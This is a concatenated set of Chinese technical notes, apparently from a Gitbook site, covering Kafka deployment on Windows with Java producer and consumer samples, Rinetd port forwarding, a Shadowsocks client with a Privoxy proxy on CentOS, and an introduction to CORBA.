%INSTALL_DIR%/bin/windows/kafka-run-class.bat 脚本，把其中的： COMMAND=%JAVA% %KAFKA_HEAP_OPTS% %KAFKA_JVM_PERFORMANCE_OPTS% %KAFKA_JMX_OPTS% %KAFKA_LOG4J_OPTS% -cp %CLASSPATH% %KAFKA_OPTS% %* 修改为： COMMAND=%JAVA% %KAFKA_HEAP_OPTS% %KAFKA_JVM_PERFORMANCE_OPTS% %KAFKA_JMX_OPTS% %KAFKA_LOG4J_OPTS% -cp \"%CLASSPATH%\" %KAFKA_OPTS% %* 亦即 \"%CLASSPATH%\" 需要增加双引号包围。 这是因为在Windows环境下，JDK安装的默认路径都是 C:\\Program Files\\Java ，而因为其中的 Program Files 有空格，会导致kafka启动时报错： 错误: 找不到或无法加载主类 Files\\Java\\jdk1.8.0_77\\lib\\dt.jar;C:\\Program 然后在 %INSTALL_DIR% 目录下新建一个 run-kafka.bat 脚本，内容如下： start ./bin/windows/kafka-server-start.bat ./config/server.properties 这样只需运行 run-kafka.bat 脚本，即可启动kafka （在此前需先启动zookeeper集群）。 至此 kafka部署完成。 > **[info]** 若要启动多个kafka，只需要复制server.properties配置文件，并修改其中的 broker.id、port 、log.dirs参数，确保它们全局唯一，然后通过kafka-server-start.bat脚本加载不同的server.properties配置文件即可（当然直接复制整套kafka程序也是也是可以的） ## 6. 创建主题（可选） 在 %INSTALL_DIR% 目录下新建一个 create-topic.bat 脚本，内容如下： > start ./bin/windows/kafka-topics.bat --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic *自定义主题名称* 在kafka运行期间调用这个脚本，即可创建一个消息主题（命令参数中只需指定zookeeper集群中任意一台机器即可）。 但是这种创建主题的方式比较麻烦，建议还是通过代码执行主题创建。而且这个版本的kafka默认是可以自动创建主题的，就更没有这个必要了。 7. 使用Java测试kafka消息发布/订阅 官方的Maven原生构件： org.apache.kafka kafka_2.12 2.0.0 org.apache.kafka kafka-clients 2.0.0 生产者样例代码： import java.util.Properties; import org.apache.kafka.clients.producer.KafkaProducer; import org.apache.kafka.clients.producer.ProducerConfig; import org.apache.kafka.clients.producer.ProducerRecord; import org.apache.kafka.common.serialization.StringSerializer; /** * * kafka生产者样例 * * PROJECT : kafka * SUPPORT : www.exp-blog.com * @version 2018-08-02 * @author EXP: 272629724@qq.com * @since jdk版本：jdk1.6 */ public class DemoProducer { public static void main(String[] args) throws Exception { final String KAFKA_SOCKET = \"127.0.0.1:9092\"; final String TOPIC = \"exp-topic-test\"; DemoProducer producer = new DemoProducer(KAFKA_SOCKET); producer.produce(TOPIC); producer.close(); } /** kafka生产者对象 */ private KafkaProducer producer; /** * 构造函数 * @param kafkaSocket */ private DemoProducer(String kafkaSocket) { Properties props = new Properties(); props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaSocket); props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); this.producer = new KafkaProducer(props); } /** * 连续发送消息到指定主题 * @param TOPIC 消息主题, 当主题只有一个分区时, 逻辑上可以认为主题是一个队列 * （当前版本的kafka默认会自动创建不存在的主题, 无需预建） * @throws Exception */ public void produce(final String TOPIC) throws Exception { for(int i = 0; i msg = new ProducerRecord(TOPIC, data); producer.send(msg); Thread.sleep(10); } } public void close() { producer.close(); } } 消费者样例代码： import java.util.Arrays; import java.util.Properties; import org.apache.kafka.clients.consumer.Consumer; import org.apache.kafka.clients.consumer.ConsumerConfig; import org.apache.kafka.clients.consumer.ConsumerRecord; import org.apache.kafka.clients.consumer.ConsumerRecords; import org.apache.kafka.clients.consumer.KafkaConsumer; import org.apache.kafka.common.serialization.StringSerializer; /** * * kafka消费者样例 * * PROJECT : kafka * SUPPORT : www.exp-blog.com * @version 2018-08-02 * @author EXP: 272629724@qq.com * @since jdk版本：jdk1.6 */ public class DemoConsumer { public static void main(String[] args) throws Exception { final String KAFKA_SOCKET = \"127.0.0.1:9092\"; final String TOPIC = \"exp-topic-test\"; final String GROUP_ID = \"group-1\"; DemoConsumer consumer = new DemoConsumer(KAFKA_SOCKET, GROUP_ID); consumer.consume(TOPIC); } /** kafka消费者对象 */ private Consumer consumer; /** * 构造函数 * @param kafkaSocket * @param groupId Consumer所在的Group * （一个Topic可以对应多个Group, 不论是多播还是单播, kafka只会把消息发到Group, * Consumer只能收到它所在的Group的消息） */ private DemoConsumer(String kafkaSocket, String groupId) { Properties props = new Properties(); props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaSocket); props.put(ConsumerConfig.GROUP_ID_CONFIG, groupId); props.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \"latest\"); // 消息偏移, latest表示最新的消息 props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \"true\"); // 自动提交 props.put(ConsumerConfig.AUTO_COMMIT_INTERVAL_MS_CONFIG, \"1000\"); // 自动提交间隔(ms) props.put(ConsumerConfig.SESSION_TIMEOUT_MS_CONFIG, \"30000\"); // 会话超时(ms) props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); this.consumer = new KafkaConsumer(props); } /** * 从指定主题连续消费消息 * @param TOPICS 消息主题集, 当主题只有一个分区时, 逻辑上可以认为主题是一个队列 * @throws Exception */ @SuppressWarnings(\"deprecation\") private void consume(final String... TOPICS) throws Exception { consumer.subscribe(Arrays.asList(TOPICS)); // 可同时消费多个topic while(true) { ConsumerRecords records = consumer.poll(1000); for(ConsumerRecord record : records) { String msg = String.format(\"offset = %d, key = %s, value = %s\", record.offset(), record.key(), record.value()); System.out.printf(msg); Thread.sleep(10); } } } public void close() { consumer.close(); } } 8. 附录1：kafka常见的错误与解决方法 Kafka运维填坑：https://www.jianshu.com/p/d2cbaae38014 9. 附录2：server.properties参数说明 参数与默认值 说明 broker.id =0 每一个broker在集群中的唯一表示，要求是正数。当该服务器的IP地址发生改变时，broker.id没有变化，则不会影响consumers的消息情况 log.dirs=/data/kafka-logs kafka数据的存放目录（必须是绝对路径），多个目录用逗号分割。多个目录分布在不同磁盘上可以提高读写性能，如： /data/kafka-logs-1，/data/kafka-logs-2 port =9092 broker server服务端口 message.max.bytes =6525000 表示消息体的最大大小，单位是字节 num.network.threads =4 broker处理消息的最大线程数，一般情况下数量为cpu核数 num.io.threads =8 broker处理磁盘IO的线程数，数值为cpu核数2倍 background.threads =4 一些后台任务处理的线程数，例如过期消息文件的删除等，一般情况下不需要去做修改 queued.max.requests =500 等待IO线程处理的请求队列最大数，若是等待IO的请求超过这个数值，那么会停止接受外部消息，应该是一种自我保护机制 host.name broker的主机地址，若是设置了，那么会绑定到这个地址上，若是没有，会绑定到所有的接口上，并将其中之一发送到ZK，一般不设置 socket.send.buffer.bytes=100*1024 socket的发送缓冲区，socket的调优参数SO_SNDBUFF socket.receive.buffer.bytes =100*1024 socket的接受缓冲区，socket的调优参数SO_RCVBUFF socket.request.max.bytes =100*1024*1024 socket请求的最大数值，防止serverOOM，message.max.bytes必然要小于socket.request.max.bytes，会被topic创建时的指定参数覆盖 log.segment.bytes =1024*1024*1024 topic的分区是以一堆segment文件存储的，这个控制每个segment的大小，会被topic创建时的指定参数覆盖 log.roll.hours =24*7 这个参数会在日志segment没有达到log.segment.bytes设置的大小，也会强制新建一个segment会被topic创建时的指定参数覆盖 log.cleanup.policy = delete 日志清理策略选择有：delete和compact主要针对过期数据的处理，或是日志文件达到限制的额度，会被topic创建时的指定参数覆盖 log.retention.minutes=300或log.retention.hours=24 数据文件保留多长时间， 存储的最大时间超过这个时间会根据log.cleanup.policy设置数据清除策略。有2种删除数据文件方式：① 按文件大小删除：log.retention.bytes② 按2种不同时间粒度删除：分钟log.retention.minutes、小时log.retention.hours log.retention.bytes=-1 topic每个分区的最大文件大小一个topic的大小限制=分区数*log.retention.bytes-1表示没有大小限制。该参数会被topic创建时的指定参数覆盖 log.retention.check.interval.ms=5minutes 文件大小检查的周期时间，是否处罚log.cleanup.policy中设置的策略 log.cleaner.enable=false 是否开启日志清理 log.cleaner.threads =2 日志清理运行的线程数 log.cleaner.io.max.bytes.per.second=None 日志清理时候处理的最大大小 log.cleaner.dedupe.buffer.size=500*1024*1024 日志清理去重时候的缓存空间，在空间允许的情况下，越大越好 log.cleaner.io.buffer.size=512*1024 日志清理时候用到的IO块大小一般不需要修改 log.cleaner.io.buffer.load.factor =0.9 日志清理中hash表的扩大因子一般不需要修改 log.cleaner.backoff.ms =15000 检查是否处罚日志清理的间隔 log.cleaner.min.cleanable.ratio=0.5 日志清理的频率控制，越大意味着更高效的清理，同时会存在一些空间上的浪费，会被topic创建时的指定参数覆盖 log.cleaner.delete.retention.ms =1day 对于压缩的日志保留的最长时间，也是客户端消费消息的最长时间，同log.retention.minutes的区别在于一个控制未压缩数据，一个控制压缩后的数据。会被topic创建时的指定参数覆盖 log.index.size.max.bytes =10*1024*1024 对于segment日志的索引文件大小限制，会被topic创建时的指定参数覆盖 log.index.interval.bytes =4096 当执行一个fetch操作后，需要一定的空间来扫描最近的offset大小，设置越大，代表扫描速度越快，但是也更好内存，一般情况下不需要配置这个参数 log.flush.interval.messages=None log文件“sync”到磁盘之前累积的消息条数，例如log.flush.interval.messages=1000表示每当消息记录数达到1000时flush一次数据到磁盘。因为磁盘IO操作是一个慢操作，但又是一个“数据可靠性”的必要手段，所以此参数的设置，需要在“数据可靠性”与“性能”之间做必要的权衡。如果此值过大，将会导致每次“fsync”的时间较长（IO阻塞），如果此值过小，将会导致“fsync”的次数较多，这也意味着整体的client请求有一定的延迟。物理server故障，将会导致没有fsync的消息丢失 log.flush.scheduler.interval.ms =3000 检查是否需要固化到硬盘的时间间隔 log.flush.interval.ms = None 仅仅通过interval来控制消息的磁盘写入时机是不够的。此参数用于控制“fsync”的时间间隔，如果消息量始终没有达到阀值，但是离上一次磁盘同步的时间间隔达到阀值，也将触发。例如：log.flush.interval.ms=1000表示每间隔1000毫秒flush一次数据到磁盘 log.delete.delay.ms =60000 文件在索引中清除后保留的时间一般不需要去修改 log.flush.offset.checkpoint.interval.ms =60000 控制上次固化硬盘的时间点，以便于数据恢复一般不需要去修改 auto.create.topics.enable =true 是否允许自动创建topic，若是false，就需要通过命令创建topic default.replication.factor =1 是否允许自动创建topic，若是false，就需要通过命令创建topic num.partitions =1 每个topic的分区个数，若是在topic创建时候没有指定则会被topic创建时的指定参数覆盖 controller.socket.timeout.ms =30000 partition leader与replicas之间通讯时，socket的超时时间 controller.message.queue.size=10 partition leader与replicas数据同步时，消息的队列尺寸 replica.lag.time.max.ms =10000 replicas响应partition leader的最长等待时间，若是超过这个时间，就将replicas列入ISR(in-sync replicas)，并认为它是死的，不会再加入管理中 replica.lag.max.messages =4000 如果follower落后与leader太多，将会认为此follower（或者说partition relicas）已经失效。通常，在follower与leader通讯时，因为网络延迟或者链接断开，总会导致replicas中消息同步滞后。如果消息之后太多，leader将认为此follower网络延迟较大或者消息吞吐能力有限，将会把此replicas迁移到其他follower中。在broker数量较少，或者网络不足的环境中，建议提高此值 replica.socket.timeout.ms=30*1000 follower与leader之间的socket超时时间 replica.socket.receive.buffer.bytes=64*1024 leader复制时候的socket缓存大小 replica.fetch.max.bytes =1024*1024 replicas每次获取数据的最大大小 replica.fetch.wait.max.ms =500 replicas同leader之间通信的最大等待时间，失败了会重试 replica.fetch.min.bytes =1 fetch的最小数据尺寸，如果leader中尚未同步的数据不足此值，将会阻塞直到满足条件 num.replica.fetchers=1 leader进行复制的线程数，增大这个数值会增加follower的IO replica.high.watermark.checkpoint.interval.ms =5000 每个replica检查是否将最高水位进行固化的频率 controlled.shutdown.enable =false 是否允许控制器关闭broker，若是设置为true，会关闭所有在这个broker上的leader，并转移到其他broker controlled.shutdown.max.retries =3 控制器关闭的尝试次数 controlled.shutdown.retry.backoff.ms =5000 每次关闭尝试的时间间隔 leader.imbalance.per.broker.percentage =10 leader的不平衡比例，若是超过这个数值，会对分区进行重新的平衡 leader.imbalance.check.interval.seconds =300 检查leader是否不平衡的时间间隔 offset.metadata.max.bytes 客户端保留offset信息的最大空间大小 zookeeper.connect = localhost:2181 zookeeper集群的地址（连接串），可以是多个，多个之间用逗号分割。例如：hostname1:port1,hostname2:port2,hostname3:port3 zookeeper.session.timeout.ms=6000 zooKeeper的最大超时时间，就是心跳的间隔。若是没有反应，那么认为已经死了，因此该值不易过大 zookeeper.connection.timeout.ms =6000 zooKeeper的连接超时时间 zookeeper.sync.time.ms =2000 zooKeeper集群中leader和follower之间的同步时间 资源下载 本文全文下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/net/":{"url":"markdown/notes/net/","title":"网络协议","keywords":"","body":"网络网络 Centos 实现端口转发：Rinetd 部署笔记 Shadowsocks客户端 + Privoxy实现外网访问 Corba 接口学习笔记 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/net/Rinetd部署笔记.html":{"url":"markdown/notes/net/Rinetd部署笔记.html","title":"Rinetd 端口转发部署笔记","keywords":"","body":"Centos 实现端口转发：Rinetd 部署笔记前言Rinetd部署环境Rinetd安装Rinetd配置Rinetd使用资源下载Centos 实现端口转发：Rinetd 部署笔记 前言 虽然Linux本身自带的iptables可以实现端口转发功能，但其配置相对复杂。因此本文介绍另一个端口转发工具Rinetd，其安装和配置都更为简单。 Rinetd部署环境 本文是基于Centos7系统部署Rinetd端口转发工具。 Rinetd安装 到官网下载最新版，得到安装包rinetd.tar.gz ： 官网地址：https://boutell.com/rinetd/ 上传到Linux，本文上传位置为： /usr/local/ 解压安装包： tar -zxvf rinetd.tar.gz 由于Rinetd需要编译安装，先安装gcc编译环境： yum install gcc 进入Rinetd安装目录： cd /usr/local/rinetd 检查安装配置文件： vi Makefile 注意配置文件中涉及到两处安装路径，一般情况下保持默认值即可： CFLAGS=-DLINUX -g rinetd: rinetd.o match.o gcc rinetd.o match.o -o rinetd install: rinetd install -m 700 rinetd /usr/sbin install -m 644 rinetd.8 /usr/man/man8 但是若 /usr/man/man8 目录不存在，需要先手建： mkdir -p /usr/man/man8 编译并安装： make && make install 至此Rinetd安装完成。 Rinetd配置 配置端口转发规则（该文件可能不存在，直接创建即可）： vi /etc/rinetd.conf 该文件每行一个转发规则，配置格式为： [source_address] [source_port] [destination_address] [destination_port] 即： [本机IP（若非多网卡直接设为0.0.0.0）] [转发端口] [服务IP] [服务端口] 如： 0.0.0.0 9527 192.168.64.22 9527 Rinetd使用 Rinetd的启动需要指定规则配置文件，而停止需要杀掉进程： 启动：rinetd -c /etc/rinetd.conf 停止：killall rinetd 查看端口转发状态： netstat -tanulp|grep rinetd 资源下载 本文全文下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/net/Shadowsocks实现外网访问.html":{"url":"markdown/notes/net/Shadowsocks实现外网访问.html","title":"Shadowsocks 实现外网访问","keywords":"","body":"Shadowsocks客户端 + Privoxy实现外网访问1. 前言1.1. 关于Shadowsocks1.2. 关于Privoxy1.3. 代理服务架构2. 安装Shadowsocks客户端3. 配置VPS服务器连接信息4. 配置Shadowsocks的启动服务7. 设置http / https代理8. 启动privoxy代理服务9. 测试代理访问外网10. 取消代理10.1. 临时取消代理10.2. 永久取消代理附：关于PAC规则资源下载Shadowsocks客户端 + Privoxy实现外网访问 1. 前言 首先声明本文是 基于Centos7环境 下搭建 Shadowsocks客户端 （而非服务端），换而言之，你首先得有一台VPS服务器（网上很容易买得到，不贵，其搭建教程网上也有很多，例如：《ubuntu18.0.4搭建ss服务器》）。 1.1. 关于Shadowsocks 由于工作需要经常需要访问国外网站，而国内VPN被锁的今天，剩下较好的途径就是通过VPS进行代理了。而其中最出色的就要数Shadowsocks了。 Shadowsocks提供了全局和PAC（Proxy auto-config）两种代理模式，PAC的支持使得我们可以自定代理规则，决定哪些是国内IP只需直连、哪些是国外IP要走代理，不但效率比全局高，还能节省VPS流量。 Shadowsocks的官方Github：https://github.com/shadowsocks 1.2. 关于Privoxy privoxy也是一个代理服务器，之所以要安装它，是因为Shadowsocks 只是一个socket5服务，不能直接用于网页访问，其主要作用是搭建与VPS之间的桥梁和实现PAC筛选规则。 而privoxy则可以弥补网页访问的问题，把socket5的流量转到 http / https上。 1.3. 代理服务架构 在开始搭建代理服务之前，先看一下我们最终要实现的代理服务架构示意图，有利于理解代理流程，便于进行后续变更操作： 2. 安装Shadowsocks客户端 Shadowsocks需要使用pip命令安装，因此首先安装epel源和pip包管理： yum -y install epel-release yum -y install python-pip 安装Shadowsocks客户端： pip install shadowsocks 安装成功后，Shadowsocks的启动脚本位置在： /usr/bin/sslocal 3. 配置VPS服务器连接信息 新建Shadowsocks配置文件（默认是不存在的）： > mkdir /etc/shadowsocks > vi /etc/shadowsocks/shadowsocks.json 设置VPS服务器的配置信息如下（请提前购置VPS服务器，本文不提供）： { \"server\": \"x.x.x.x\",　　　　　# Shadowsocks服务器地址（根据实际修改） \"server_port\": 443,　　　　　# Shadowsocks服务器端口（根据实际修改） \"local_address\": \"127.0.0.1\",　# 本地IP \"local_port\": 1080,　　　　　# 本地端口（默认为1080，下面多处用到，建议不修改） \"password\": \"xxxxxxxx\",　　# Shadowsocks连接密码（根据实际修改） \"timeout\": 300,　　　　　　# 等待超时时间 \"method\": \"aes-256-cfb\",　# 加密方式（根据实际修改） \"workers\": 1, 　　　　　　#工作线程数 \"fast_open\": false　# true或false。不建议开启，开启可以降低延迟，但要求Linux内核在3.7+以上，若开启后访问网站出现502错误，请关闭。 } 顺便一提，查看linux内核信息的指令为： uname -r 4. 配置Shadowsocks的启动服务 新建启动脚本文件： vi /etc/systemd/system/shadowsocks.service 设置内容如下： [Unit] Description=Shadowsocks [Service] TimeoutStartSec=0 ExecStart=/usr/bin/sslocal -c /etc/shadowsocks/shadowsocks.json [Install] WantedBy=multi-user.target 设置为开机自启动： systemctl enable shadowsocks.service 启动Shadowsocks服务： systemctl start shadowsocks.service 查看Shadowsocks服务状态（可查看代理日志）： systemctl status shadowsocks.service 若启动失败提示，且提示 【error:[Errno 98] Address already in use】，说明1080代理端口被占用，可通过此命令查看是哪个进程占用了1080端口，把它kill掉（或改修改代理端口也可）： lsof -i:8080 验证Shadowsocks客户端服务是否正常运行： curl --socks5 127.0.0.1:1080 http://httpbin.org/ip 若Shadowsock客户端服务已正常运行，会返回VPS服务器的IP： { \"origin\": \"x.x.x.x\"　　# 前面设置的VPS服务器IP } 至此Shadowsocks安装完成，但是代理是未能生效的，原因是Shadowsocks 只是一个 socket5 服务，我们需要再安装一个privoxy代理服务器，利用privoxy把流量转到 http / https上。 ## 5. 安装privoxy代理服务器 安装privoxy，直接安装即可： > yum install privoxy -y ## 6. 配置privoxy监听和转发端口 privoxy的配置文件默认为： > /etc/privoxy/config 默认情况下无需修改，主要关注配置文件中的两处： listen-address 127.0.0.1:8118　　# 8118 是privoxy的默认监听端口，一般不用改 forward-socks5t / 127.0.0.1:1080 .　　# 转发到Shadowsocks的代理端口，注意最后有个点 7. 设置http / https代理 privoxy是通过读取系统环境变量进行代理转发的，修改Centos的系统环境变量配置文件： vi /etc/profile 在配置文件最后添加如下系统环境变量（全局代理和FTP代理可按需配置）： PROXY_HOST=127.0.0.1 export all_proxy=http://$PROXY_HOST:8118　　# 全局代理 export ftp_proxy=http://$PROXY_HOST:8118　　# FTP代理 export http_proxy=http://$PROXY_HOST:8118　　# HTTP代理 export https_proxy=http://$PROXY_HOST:8118　　# HTTPS代理 export no_proxy=localhost,172.16.0.0/16,192.168.0.0/16.,127.0.0.1,10.10.0.0/16　　# 不代理本地请求 重载系统环境变量： source /etc/profile 通过env命令可打印当前的所有系统环境变量，确认是否已正确添加： env 8. 启动privoxy代理服务 设置为开机自启动： systemctl enable privoxy 启动privoxy服务： systemctl start privoxy 查看privoxy服务状态（可查看代理日志）： systemctl status privoxy 至此privoxy安装完成，全部代理配置完成，可以开始访问外网了。 9. 测试代理访问外网 通过以下命令访问Google主页，若返回HTTP 200状态码则访问成功： curl -I www.google.com 10. 取消代理 10.1. 临时取消代理 从代理服务架构图可知，本地需要走代理的请求，都先通过privoxy做协议筛选，再转发到Shadowsocks的。而privoxy筛选的依据就是我们在 /etc/profile 中所配置的系统环境变量。 因此可以通过unset命令删除包含关键字proxy的系统环境变量（前面新增的5个系统环境变量均含有关键字proxy）： while read var; do unset $var; done proxy | awk -F= '{print $1}') 由于unset命令只是删除当前会话的环境变量，所以这只是临时取消的方法，只要重新连接Centos会话就可恢复代理。 另外重载系统环境变量也可实现恢复代理： source /etc/profile 10.2. 永久取消代理 要彻底取消代理，可修改系统环境变量的配置文件 /etc/profile ，把前面添加的5个proxy变量注释掉即可： # PROXY_HOST=127.0.0.1 # export all_proxy=http://$PROXY_HOST:8118 # 全局代理 # export ftp_proxy=http://$PROXY_HOST:8118 # FTP代理 # export http_proxy=http://$PROXY_HOST:8118 # HTTP代理 # export https_proxy=http://$PROXY_HOST:8118 # HTTPS代理 # export no_proxy=localhost,172.16.0.0/16,192.168.0.0/16.,127.0.0.1,10.10.0.0/16 # 不代理本地 当然，为了节省资源，你可以进一步地停止Shadowsocks和privoxy服务： systemctl disable shadowsocks.service systemctl stop shadowsocks.service systemctl disable privoxy systemctl stop privoxy 附：关于PAC规则 使用Shadowsocks最大的特色就是可以使用PAC规则自动筛选国内外站点是否需要代理。在Windows下是很容易实现这个需求的： 在Linux下可以通过安装GenPAC在GFWList上获取PAC文件，但是似乎只能在VPS服务器上进行配置，而无法在Shadowsocks客户端中配置（至少目前我还没找到配置方法，以后我若找到方法会分享出来）。 资源下载 本文全文下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/net/Corba接口学习笔记.html":{"url":"markdown/notes/net/Corba接口学习笔记.html","title":"Corba 接口学习笔记","keywords":"","body":"Corba接口学习笔记1. CORBA简介2. CORBA的基本概念2.1. ORB（Object Request Broker）对象请求代理2.2. IDL（Interface Definition Language）接口定义语言2.3. OA（Object Adapter）对象适配器2.4. GIOP（General Inter-ORB Protocol）通用ORB协议2.5. 其他常见概念3. CORBA的体系结构4. CORBA的应用程序结构5. Java IDL简介5.1. 认识IDL5.2. IDL中的几个重要概念5.3. IDL元素与Java元素的映射关系6. CORBA接口开发入门6.1. Borland VisiBroker Edition简介6.2. 开发环境的安装6.3. CORBA版Hello World应用开发实例7. CORBA常用的四种服务简介7.1. 名字服务7.2. 事件服务7.3. 通知服务7.4. 交易服务Corba接口学习笔记 1. CORBA简介 CORBA（Common Object Request Broker Architecture），公用对象请求代管者体系结构，它是为了实现分布式计算而引入的。为了说明CORBA在分布计算上有何特点，我们从它与其它几种分布计算技术的比较中进行说明。 与过去的面向过程的RPC（Remote Procedure Call）不同，CORBA是基于面向对象技术的，它能解决远程对象之间的互操作问题。 MicroSoft的DCOM（Distributed Component Object Model）也是解决这一问题的，但它基于Windows操作系统，虽然DCOM已有在其他操作系统如Sun Solaris，Digital Unix，IBM MVS上的实现，但毫无疑问，只有在微软的操作系统上才会实现得更好。而只有CORBA是真正跨平台的，平台独立性正是CORBA的初衷之一。 另一种做到平台无关性的技术是Java RMI（Remote Method Invocation），但它只能用JAVA实现。CORBA与此不同，它通过一种叫IDL（Interface Definition Language）的接口定义语言，能做到语言无关，也就是说，任何语言都能制作CORBA组件，而CORBA组件能在任何语言下使用。 因此，可以这样理解CORBA：CORBA一种异构平台下的语言无关的对象互操作模型。 2. CORBA的基本概念 2.1. ORB（Object Request Broker）对象请求代理 CORBA体系结构的核心就是ORB。 下图为ORB的基本模型，它作为一个\"软件总线\"来连接网络上的不同对象，提供对象的定位和方法调用，可以这样简单理解：ORB就是使得客户应用程序能调用远端对象方法的一种机制。 具体来说就是：当客户程序要调用远程对象上的方法时，首先要得到这个远程对象的引用，之后就可以像调用本地方法一样调用远程对象的方法。当发出一个调用时，实际上ORB会截取这个调用（通过客户Stub完成），因为客户和服务器可能在不同的网络、不同的操作系统上甚至用不同的语言实现，ORB还要负责将调用的名字、参数等编码成标准的方式（称为Marshaling）通过网络传输到服务器方（实际上在同一台机器上也如此），并将参数通过Unmarshaling的过程传到正确的对象上（这个过程叫重定向，Redirecting），服务器对象完成处理后，ORB通过同样的Marshaling/Unmarshaling方式将结果返回给客户。 因此，ORB是一种功能，它具备以下能力： 对象定位（根据对象引用定位对象的实现） 对象定位后，确信Server能接受请求 将客户方请求通过Marshaling/Unmarshing方式重定向到服务器对象上 如果需要，将结果以同样的方式返回 [info] Marshaling一个对象的过程就是一个序列化（deflating）的过程，相应的Unmarshaling就可以看作是反序列化（inflating）的过程。 2.2. IDL（Interface Definition Language）接口定义语言 如果说ORB使CORBA做到平台无关，那么IDL则使CORBA做到语言无关。 正像其名字中显示的那样，IDL仅仅定义接口，而不定义实现，类似于C中的头文件。实际上它不是真正的编程语言。要用它编写应用，需要将它映射它相应的程序设计语言上去，如映射到C++或JAVA上去。映射后的代码叫Client Stub Code和Server Skeleton Code。 IDL的好处是使高层设计人员不必考虑实现细节而只需关心功能描述。IDL可以说是描述性语言。设计IDL的过程也是设计对象模型的过程。它是编写CORBA应用的第一步，在整个软件设计过程中至关重要。 IDL的语法很像C++，当然也像Java。很难想像一个程序设计人员是不懂C或Java的，所以，几乎所有的程序设计人员都能迅速理解IDL。而这正是IDL设计者所希望的。 2.3. OA（Object Adapter）对象适配器 OA用于构造对象实现与ORB之间的接口。它给框架发送方法，调用并且支持服务器对象的生命周期，完成对象引用的生成、维护，对象定位等功能。对象适配器有各种各样的，常用的有两种： BOA（Basic Object Adapter）基本对象适配器：负责激活对象，即当客户请求对象的服务时，激活对象实现的能力。 POA（Portable Object Adapter）可移植对象适配器：是BOA的替代方式，提供大量可扩展的接口，来处理一些对于BOA来说不合理的要求。 2.4. GIOP（General Inter-ORB Protocol）通用ORB协议 我们知道，客户和服务器是通过ORB交互的，那么，客户方的ORB和服务器方的ORB又是通过什么方式通信呢？通过GIOP(General Inter-ORB Protocol)。也就是说，GIOP是一种通信协议，它规定了客户和服务器的ORBs间的通信机制。 GIOP设计的尽可能简单，开销最小，同时又具有最广泛的适应性和可扩展性，以适应不同的网络。它定义了以下两个方面： The Common Data Representation (CDR) definition.（通用数据表示定义）：它实际上是IDL数据类型在网上传输时的编码方案。它对所有IDL数据类型的映射都作了规定。 GIOP Message Formats（GIPO消息格式）：它规定了Client和Server两个角色之间要传输的消息格式。主要包括Request和Reply两种消息。 GIOP因为是一种通用协议，所以不能直接使用。在不同的网络上需要有不同的实现。目前使用最广的便是Internet上的GIOP，称为IIOP（Internet Inter-ORB Protocol），IIOP把GIOP消息数据映射为TCP/IP连接行为和输入/输出流读/写。 [info] IIOP不是完全从GIOP分离出来的协议，它更像是GIOP的一个实例。 2.5. 其他常见概念 DII（Dynamic Invocation Interface）动态调用接口：位于客户端，发送客户端的调用请求。 DSI（Dynamic Skeleton Interface）动态框架接口，位于服务器端，传送客户端的调用请求。 SII（Static Invocation Interface）静态调用接口：位于客户端，客户与ORB之间的静态接口。 SSI（Static Skeleton Interface）静态框架接口：位于服务器端，ORB与服务器之间的静态接口。 stub存根：位于客户端，由IDL编译器编译IDL文件生成，其功能类似一个客户代理。 skeleton框架：位于服务器端，由IDL编译器编译IDL文件生成，其功能是负责发送一个操作调用给能实现此操作的服务。 IR（Interface Repository）接口存储库：存储运行时所需要的IDL规范。 IMR（Implementation Repository）实现存储库：存储对象实现（一个服务器）的详细信息（即一个执行程序需要被放置在哪一个服务器上）。 IOR（Interoperable Object Reference）可操作对象引用：它包括所有客户与服务器联系所需的各种信息（包括CORBA服务器对象进程的IP地址和TCP端口等），ORB将通过它产生在网络上唯一标识那个将被分布对象的消息。 ORBAservices（CORBA服务）：在ORB级别之上，定义了大多数分布式企业对象利用的公共服务，如命名服务、交易对象服务、关系服务、生命周期服务、外表化服务、持久性服务、查询服务、对象集合服务、属性服务、事件服务、许可证服务、时间服务、事务服务、并发控制服务和安全服务等。 CORBAfacilities（CORBA工厂）：位于CORBAservices之上，定义了更高层次的分步式服务与框架。如：打印、电子邮件、文档管理等。 3. CORBA的体系结构 上图为CORBA的体系结构图，它描述了以下内容： CORBA规范中定义了IDL语言及其向其他高级语言的映射。类似于COM中的IDL语言，OMG的IDL语言通过说明对象的接口来定义对象，它也是一种描述性语言。一个接口同样包括一组命名的操作和相应于这些接口的参数。 ORB核心提供了客户与对象间实现透明通信的方法，它可以屏蔽对象实现位置、实现方式、状态和通信机制等细节以及不同实现间可能存在的差异。 对象适配器位于ORB核心和对象实现之间，它负责服务对象的注册、对象引用的创建和解释、对象实现的服务进程的激活和去活、对象实现的激活和去活以及客户请求的分发。 IDL存根为客户提供了静态调用方式，IDL构架为客户提供了静态实现方式。IDL编译器编译描述服务对象接口的IDL文件，生成对应于具体编程语言的IDL存根和IDL构架程序。IDL存根负责把用户的请求进行编码，发送到对象实现端，并对接收到的处理结果进行解释，把结果或异常信息返回给用户；IDL构架对用户请求进行解码，定位所请求的对象的方法，执行该方法，并把执行结果或异常信息编码后发送给客户。 动态调用接口DII（Dynamic Invocation Interface）和动态构架接口DSI（Dynamic Skeleton 